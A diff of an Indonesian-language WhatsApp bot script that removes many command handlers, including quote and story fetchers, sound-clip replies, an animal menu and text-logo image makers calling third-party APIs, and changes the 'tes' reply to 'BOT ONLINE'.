-				zhain = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=${lolhumanapi}&name=${ct}`)
-				Ramdani.sendMessage(from, zhain, image, { quoted: mek, caption: 'Nih Dah Jadi' })
-				break
-//------------------< cerita menu >-------------------
-case 'cerpen':
-                    if (!isRegist) return freply(mess.regist)
-                    if (isBanned) return freply(mess.banned)
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${lolhumanapi}`)
-                    get_result = get_result.result
-                    ini_txt = `Title : ${get_result.title}\n`
-                    ini_txt += `Creator : ${get_result.creator}\n`
-                    ini_txt += `Story :\n${get_result.cerpen}`
-                    freply(ini_txt)
-                    break
-case 'ceritahoror':
-                    if (!isRegist) return freply(mess.regist)
-                    if (isBanned) return freply(mess.banned)
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${lolhumanapi}`)
-                    get_result = get_result.result
-                    ini_txt = `Title : ${get_result.title}\n`
-                    ini_txt += `Desc : ${get_result.desc}\n`
-                    ini_txt += `Story :\n${get_result.story}\n`
-                    thumbnail = await getBuffer(get_result.thumbnail)
-                    Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
-                     break 
-//------------------(KATA KATA MENU)---------+--------
-     case 'quotes':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolhumanapi}`)
-                    quotes = quotes.result
-                    author = quotes.by
-                    quotes = quotes.quote
-                    freply(`_${quotes}_\n\n*― ${author}*`)
-                    break
-                case 'quotesanime':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolhumanapi}`)
-                    quotes = quotes.result
-                    quote = quotes.quote
-                    char = quotes.character
-                    anime = quotes.anime
-                    episode = quotes.episode
-                    freply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
-                    break
-case 'quotesdilan':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolhumanapi}`)
-                    freply(quotedilan.result)
-                    break   
-               case 'faktaunik':
-                case 'katabijak':
-                case 'pantun':
-                case 'bucin':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumanapi}`)
-                    freply(get_result.result)
-                    break                                         
 //------------------< enable/disable>-------------------
               case 'leveling':
               if (!isRegist) return freply(mess.regist)
@@ -6299,118 +3230,6 @@ case 'quotesdilan':
 satu = fs.readFileSync('./media/audio/sound1.mp3');
 Ramdani.sendMessage(from, satu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
 break
-case 'sound2':
-dua = fs.readFileSync('./media/audio/sound2.mp3');
-Ramdani.sendMessage(from, dua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound3':
-tiga = fs.readFileSync('./media/audio/sound3.mp3');
-Ramdani.sendMessage(from, tiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound4':
-empat = fs.readFileSync('./media/audio/sound4.mp3');
-Ramdani.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound5':
-lima = fs.readFileSync('./media/audio/sound5.mp3');
-Ramdani.sendMessage(from, lima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound6':
-enam = fs.readFileSync('./media/audio/sound6.mp3');
-Ramdani.sendMessage(from, enam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound7':
-tujuh = fs.readFileSync('./media/audio/sound7.mp3');
-Ramdani.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break									
-case 'sound8':
-delapan = fs.readFileSync('./media/audio/sound8.mp3');
-Ramdani.sendMessage(from, delapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound9':
-sembilan = fs.readFileSync('./media/audio/sound9.mp3');
-Ramdani.sendMessage(from, sembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound10':
-sepuluh = fs.readFileSync('./media/audio/sound10.mp3');
-Ramdani.sendMessage(from, sepuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound11':
-sebelas = fs.readFileSync('./media/audio/sound11.mp3');
-Ramdani.sendMessage(from, sebelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound12':
-duabelas = fs.readFileSync('./media/audio/sound12.mp3');
-Ramdani.sendMessage(from, duabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound13':
-tigabelas = fs.readFileSync('./media/audio/sound13.mp3');
-Ramdani.sendMessage(from, tigabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound14':
-empatbelas = fs.readFileSync('./media/audio/sound14.mp3');
-Ramdani.sendMessage(from, empatbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-case 'sound15':
-limabelas = fs.readFileSync('./media/audio/sound15.mp3');
-Ramdani.sendMessage(from, limabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-break
-
-//---------------<hewan menu 🗿>---------------
-case 'kambing':
-case 'kuda':
-case 'ular':  
-case 'anjing':
-case 'kucing':
-case 'kelinci':
-case 'buaya':
-case 'elang':
-case 'ayam':
-case 'babi':
-case 'ulat':
-case 'burung':
-case 'bebek':
-case 'angsa':
-case 'sapi': 
-case 'badak':
-case 'unta':
-case 'harimau':
-case 'singa':
-case 'monyet':
-case 'ikan':
-case 'ikan hiu':
-case 'tikus':
-case 'kelinci':
-case 'siput':
-case 'domba':
-case 'katak':
-case 'naga':
-case 'laba-laba':
-case 'kupu-kupu':
-case 'kalajengkin': 
-case 'kingkong':
-case 'jerapa':
-case 'gajah':
-case 'serigala':
-case 'cikcak':
-case 'pinguin':
-case 'burung hantu':
-case 'burung gagak':
-case 'burung puyuh':
-case 'ikan laga':
-case 'ikan kembung':
-case 'kepiting':
-case 'ubur-ubur':
-case 'lebah':
-case 'kura-kura':
-case 'banteng':
-case 'kelalawar':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-freply(`*MOHON MAAF FITUR INI SEDANG MAINTENANCE/DI PERBARUI!!!*`)
-reply = fs.readFileSync('./media/ara2.mp3');
-             Ramdani.sendMessage(from, reply, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-             break
    
 //══════════[ FITUR MAKER ]══════════//
 case 'blackpink':
@@ -6462,305 +3281,12 @@ anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/${c
 oke = await getBuffer(anu.result)
 Ramdani.sendMessage(from, oke, image, {quoted: mek, caption: '*Nih Kak Dah Jadi*'})
 break
-case 'hartatahta': 
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Teks nya mana?*\n_Contoh : ${prefix + command} namamu_`) 
-teks = args.join(" ")
-freply(mess.wait)
-harta = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/harta-tahta?apikey=${ramdaniapi}&text=${teks}`)
-Ramdani.sendMessage(from, harta, image, {quoted: mek, caption: '*Nih Kak Dah Jadi*'})
-break
 
-//----> 2 TEXT <----//
-
-case '8bit':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(5)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/8bit?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'pornhub':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(8)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/pornhub?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'glitch':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(7)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/glitch?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'glitch2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(8)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/glitch2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'layered':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(8)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/layered?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case '3dsteel':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(8)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/3dsteel?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'realistic':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(10)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/realistic?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'lionlogo':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(9)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/lionlogo?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'ninjalogo':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(10)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/ninjalogo?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'wolf':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(5)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/logowolf?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'wolf2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(6)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/logowolf2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'halloween2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(11)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/halloween2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'marvel':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(7)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/marvelstudio?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'marvel2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(8)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/marvelstudio2?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'cinematichorror':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(16)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/cinematichorror?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'avengers':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(8)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/avengerslogo?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'graffiti3':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(10)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/coolwallgraffiti?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'captainamerica':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(15)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/captainamerica?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
-pornhub = await getBuffer(anu.result)
-Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'girlneko':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(9)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/girlneko?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
-Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'sadboy':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(7)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/sadboy?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
-Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'kaneki':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(7)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/kaneki?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
-Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'rem':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(4)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/rem?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
-Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'lolimaker':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(9)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/lolimaker?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
-Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break
-case 'gura':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
-var F = body.slice(5)
-var F1 = F.split("&")[0];
-var F2 = F.split("&")[1]; 
-freply(mess.wait)
-girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/gura?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
-Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
-break          
 //--------------<fitur tambahan>--------------
 case 'tes':
 if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
-freply(`dah aktif om🗿`)
+freply(`*_BOT ONLINE_*`)
 break
 case 'totalfitur':
 freply(`*TOTAL FITUR SAAT IN8 : 500+*`)
